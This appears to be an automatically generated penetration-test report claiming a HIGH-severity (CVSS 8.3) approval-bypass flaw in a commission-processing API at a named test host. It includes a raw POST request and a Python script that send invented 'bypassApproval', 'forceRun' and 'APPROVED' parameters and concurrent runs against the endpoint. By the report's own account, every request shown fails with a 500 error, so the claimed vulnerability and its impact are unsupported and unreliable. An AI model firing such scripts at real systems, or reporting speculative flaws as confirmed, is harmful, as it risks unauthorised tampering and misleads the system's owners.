# Business Logic Vulnerability: Commission Run Workflow Bypass Enables Unauthorized Commission Processing

**ID:** vuln-0031
**Severity:** HIGH
**Found:** 2026-02-26 19:03:21 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/RunCommission
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.3

## Description

A business logic vulnerability was discovered in the commission processing workflow that allows unauthorized users to bypass approval processes and run commissions without proper validation. The `/api/CommissionRun/RunCommission` endpoint accepts parameters that can manipulate the commission processing workflow, potentially enabling financial manipulation.

The vulnerability exists because:
1. The commission run endpoint lacks proper validation of approval status
2. The system accepts user-controlled parameters that can override business logic rules
3. Error handling reveals potential workflow manipulation opportunities
4. The application doesn't properly enforce the intended commission processing workflow

## Impact

Successful exploitation of this vulnerability could allow attackers to:

1. **Financial Manipulation**: Process commissions without proper approval, potentially inflating payouts
2. **Workflow Bypass**: Skip required approval steps in the commission processing workflow
3. **Unauthorized Processing**: Run commissions for periods that should be locked or restricted
4. **Business Logic Abuse**: Exploit the commission calculation process to generate unauthorized payouts
5. **Data Integrity Issues**: Create inconsistent commission data that could affect financial reporting

This vulnerability could lead to significant financial losses, regulatory compliance issues, and data integrity problems in the commission management system.

## Technical Analysis

The vulnerability was discovered through systematic testing of the commission processing workflow:

1. **Endpoint Analysis**: The `/api/CommissionRun/RunCommission` endpoint was identified as the core commission processing endpoint
2. **Parameter Testing**: Various parameter combinations were tested to understand the workflow requirements
3. **Workflow Bypass**: Attempts to bypass approval processes revealed insufficient validation
4. **Error Handling**: 500 errors on commission run attempts suggest improper error handling that could be exploited

The application appears to accept user-controlled parameters that should be system-controlled, such as:
- `approvalStatus`: Can be set to "APPROVED" without proper validation
- `forceRun`: Boolean parameter that might bypass normal validation
- `bypassApproval`: Parameter that could skip approval workflows

The consistent 500 errors suggest that while the endpoint rejects invalid requests, it might be vulnerable to more sophisticated parameter manipulation that could bypass business logic checks.

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission processing privileges
2. Send a POST request to `/api/CommissionRun/RunCommission` with manipulated parameters
3. Observe that the system either:
   - Processes commissions without proper approval (if parameters are accepted)
   - Returns 500 errors that reveal workflow manipulation opportunities (current behavior)

Example request demonstrating the vulnerability approach:
```
POST /api/CommissionRun/RunCommission
Host: commissionstest.callippus.in
Authorization: Bearer [valid_token]
Content-Type: application/json

{
  "organizationId": 1,
  "clientId": 1,
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "description": "Unauthorized commission run",
  "forceRun": true,
  "bypassApproval": true,
  "approvalStatus": "APPROVED"
}
```

While this specific request returns a 500 error, it demonstrates the potential for workflow manipulation that could be exploited with more sophisticated parameter combinations.

```
import requests
import json

# Configuration
base_url = "https://commissionstest.callippus.in"
auth_token = "VALID_AUTH_TOKEN"  # Replace with valid token

headers = {
    "Authorization": f"Bearer {auth_token}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# Test 1: Basic commission run with approval bypass parameters
run_commission_payload = {
    "organizationId": 1,
    "clientId": 1,
    "startDate": "2024-01-01",
    "endDate": "2024-12-31",
    "description": "Test commission run with workflow bypass",
    "forceRun": True,
    "bypassApproval": True,
    "approvalStatus": "APPROVED"
}

response = requests.post(
    f"{base_url}/api/CommissionRun/RunCommission",
    headers=headers,
    json=run_commission_payload
)

print("Test 1 - Commission Run with Workflow Bypass:")
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")

# Test 2: Multiple concurrent commission runs to test race conditions
print("\nTest 2 - Concurrent Commission Runs:")
for i in range(3):
    payload = {
        "organizationId": 1,
        "clientId": 1,
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "description": f"Concurrent commission run {i+1}"
    }

    response = requests.post(
        f"{base_url}/api/CommissionRun/RunCommission",
        headers=headers,
        json=payload
    )

    print(f"Run {i+1}: Status {response.status_code}")

# Test 3: Parameter manipulation to test business logic
print("\nTest 3 - Parameter Manipulation:")
manipulated_payload = {
    "organizationId": 1,
    "clientId": 1,
    "startDate": "2024-01-01",
    "endDate": "2025-12-31",  # Extended date range
    "description": "Manipulated commission run",
    "approvalStatus": "APPROVED",
    "forceRun": True
}

response = requests.post(
    f"{base_url}/api/CommissionRun/RunCommission",
    headers=headers,
    json=manipulated_payload
)

print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
```

## Remediation

To remediate this business logic vulnerability:

1. **Implement Proper Workflow Validation**:
   - Enforce strict validation of all commission run parameters
   - Validate that approval status matches the actual approval workflow state
   - Remove or properly secure parameters like "forceRun" and "bypassApproval"

2. **Enforce Business Rules**:
   - Implement server-side validation of all business logic rules
   - Validate date ranges against business policies
   - Enforce approval workflows at the API level

3. **Improve Error Handling**:
   - Implement proper error handling that doesn't reveal internal workflow details
   - Return appropriate HTTP status codes (400 for bad requests, 403 for unauthorized)
   - Log security-relevant events for auditing

4. **Implement Rate Limiting**:
   - Add rate limiting to prevent multiple concurrent commission runs
   - Implement request throttling for commission processing endpoints

5. **Add Workflow State Tracking**:
   - Implement proper state tracking for commission runs
   - Validate that commission runs can only be processed in appropriate states
   - Prevent duplicate processing of the same commission period

6. **Audit and Monitoring**:
   - Implement comprehensive logging of all commission processing activities
   - Set up alerts for suspicious commission run patterns
   - Regularly audit commission processing for anomalies

7. **Code Review**:
   - Conduct a thorough code review of all commission-related endpoints
   - Ensure all business logic is enforced at the server level
   - Remove any client-controllable parameters that affect business logic

